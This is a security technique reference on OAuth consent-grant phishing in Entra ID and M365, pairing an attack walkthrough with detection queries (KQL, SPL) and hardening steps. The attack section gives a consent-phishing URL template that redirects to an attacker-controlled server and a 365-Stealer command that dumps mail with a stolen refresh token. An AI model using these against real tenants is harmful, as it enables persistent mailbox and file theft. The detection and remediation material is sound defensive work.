# [IA-PHISH-002]: Consent Grant OAuth Attacks

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-002 |
| **MITRE ATT&CK v18.1** | [Phishing: Spearphishing Link (T1566.002)](https://attack.mitre.org/techniques/T1566/002/) |
| **Tactic** | Initial Access |
| **Platforms** | Entra ID (Azure AD) / M365 |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This technique involves luring a user into granting permissions (Scopes) to a malicious multi-tenant Azure AD application controlled by the attacker. Unlike credential phishing, the user logs in to the real Microsoft site, but "consents" to give the attacker's app access to their data.
- **Attack Surface:** The OAuth 2.0 consent prompt mechanism. Users are often conditioned to click "Accept" on permission requests, especially if the app name mimics a legitimate tool.
- **Business Impact:** **Persistent Data Exfiltration** without needing the user's password. The attacker maintains access via the application service principal even if the user changes their password or enables MFA.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Valid Azure AD User (to perform the consent).
- **Vulnerable Config:**
    - Tenant setting "Users can consent to apps accessing company data on their behalf" is set to **Yes** (or restricted only for low impact scopes).
    - Lack of **Admin Consent Workflow**.
- **Tools:**
    - [365-Stealer](https://github.com/AlteredSecurity/365-Stealer)
    - [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)
    - [Fireprox](https://github.com/ustayready/fireprox) (for IP rotation)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Preparation (Register Malicious App)**
The attacker registers a multi-tenant app in their own tenant and adds high-value delegated permissions: `Mail.Read`, `User.ReadWrite.All`, `Files.Read.All`, `Offline_Access`.

**Step 2: Exploitation (Phishing Link)**
Construct the consent URL to send to the victim:
```text
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=[ATTACKER_APP_ID]&response_type=code&redirect_uri=[ATTACKER_CONTROLLED_SERVER]&response_mode=query&scope=Mail.Read%20Files.Read%20Offline_Access%20User.Read
```
*The victim clicks the link, signs in (MFA checks pass), and sees the "Permissions Requested" screen. Clicking "Accept" grants the attacker a token.*

**Step 3: Persistence/Data Access**
The attacker's server receives the `authorization_code` and exchanges it for an Access Token and Refresh Token.

```powershell
# Example using 365-Stealer to use the stolen token
python3 365-Stealer.py --refresh-token [Stolen_RefreshToken] --dump-mail
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Audit Logs
| Source | Operation Name | Filter Logic |
|---|---|---|
| **AuditLogs** | `Consent to application` | TargetResources.displayName contains suspect app names |
| **AuditLogs** | `Add service principal` | InitiatedBy is a regular user (not admin) |

#### 5.2 Microsoft Sentinel (KQL)
Detects when a user consents to a new application that requests high-risk permissions.

```kusto
AuditLogs
| where OperationName == "Consent to application"
| extend Permissions = tostring(TargetResources[0].modifiedProperties[0].newValue)
| where Permissions has_any ("Mail.Read", "Mail.ReadWrite", "Files.Read.All", "User.ReadWrite.All")
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName, Permissions, Result
```

#### 5.3 Splunk (SPL)
```spl
index=azure_ad sourcetype="azure:audit" operation_name="Consent to application"
| rex field=target_resources{}.modified_properties{}.new_value "Scope: (?<scopes>.*)"
| search scopes IN ("*Mail.Read*", "*Files.Read*")
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.1 Proactive Discovery (Hunting)
Review all illicit consent grants in the tenant.
```powershell
# Connect to Graph
Connect-MgGraph -Scopes "Directory.Read.All, DelegatedPermissionGrant.ReadWrite.All"
# List all OAuth2PermissionGrants
Get-MgOauth2PermissionGrant | Select-Object ClientId, PrincipalId, Scope
```

#### 6.2 Immediate Remediation
*   **Identity & Access:**
    *   Navigate to **Entra ID > Enterprise Applications > Consent and permissions**.
    *   Set "User consent for applications" to **"Do not allow user consent"**.
*   **Workflow:** Enable **Admin Consent Workflow**. This allows users to *request* access, which an admin can then review and approve, preventing users from arbitrarily granting access to malicious apps.

#### 6.3 Strategic Defense
*   **Cloud App Security (MDA):** Configure policies to automatically revoke access for apps that are "Low reputation" or request high-privilege scopes.
*   **Verification:** Ensure all internal apps are Publisher Verified.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-PHISH-001] (Phishing - initial contact)
> **Next Logical Step:** [REC-M365-001] (Data Mining via Graph API using the consented permissions)
